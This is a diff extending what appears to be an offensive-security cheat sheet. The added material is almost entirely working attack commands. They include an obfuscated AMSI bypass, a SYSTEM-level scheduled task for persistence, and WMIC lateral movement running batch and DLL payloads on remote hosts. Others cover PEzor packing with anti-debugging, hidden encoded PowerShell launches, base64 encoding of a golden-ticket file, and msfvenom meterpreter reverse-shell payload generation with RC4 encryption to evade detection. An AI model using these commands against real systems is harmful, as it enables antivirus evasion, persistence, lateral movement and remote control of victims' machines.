@@ -116,7 +116,10 @@ PS C:\> Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c138
 AMSI : The term 'AMSI' is not recognized as the name of a cmdlet, function, script file, or operable program.
 ```
 
-
+```powershell
+# Base 64 AMSI bypass
+	[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
+	```
 
 ### 2) Powershell Oneliner
 
@@ -159,6 +162,12 @@ Find-LAPSDelegatedGroups
 # PrivEsc
 
 # Persistence
+
+### Schedule Tasks 
+
+```cpp
+schtasks /create /ru "SYSTEM" /tn "update" /tr "cmd /c c:\windows\temp\update.bat" /sc once /f /st 06:59:00
+```
 
 ### Classic Startup folder
 
@@ -208,6 +217,46 @@ To execute this PowerShell script on the target, go to the Interact CLI, import 
 
 # Lateral Movement
 
+WMIC Lateral Movement
+
+```cpp
+	wmic /node:"192.168.1.2" process call create "C:\Perflogs\434.bat"
+	WMIC /node:"DC.example.domain" process call create "rundll32 C:\PerfLogs\arti64.dll, StartW"
+```
+
 # Domain Dominance
 
+# Misc & Encoding
 
+PeZOR Packing and Encoding 
+
+```cpp
+	PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=10 /root/Desktop/Grunt_Nim.exe -z 2
+```
+
+Cat to base64 
+
+```cpp
+	cat file.ps1 | iconv -t utf-16le | base64 -w 0
+	powershell -Sta -Nop -Window Hidden -EncodedCommand <encodedCommand>
+```
+
+Powershell Convert to base64
+
+```cpp
+[System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Users\IEUser\Desktop\golden.kirbi")) 
+``` 
+
+Hex Encode 
+
+```
+	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin
+	//cat meter.bin | openssl enc -rc4 -nosalt -k "HideMyShellzPlz?" > encmeter.bin
+	xxd -i encmeter.bin
+```
+
+Default MSF bin
+
+```
+	msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="Proxy Loading worked!" -f raw > shellcode.bin
+```
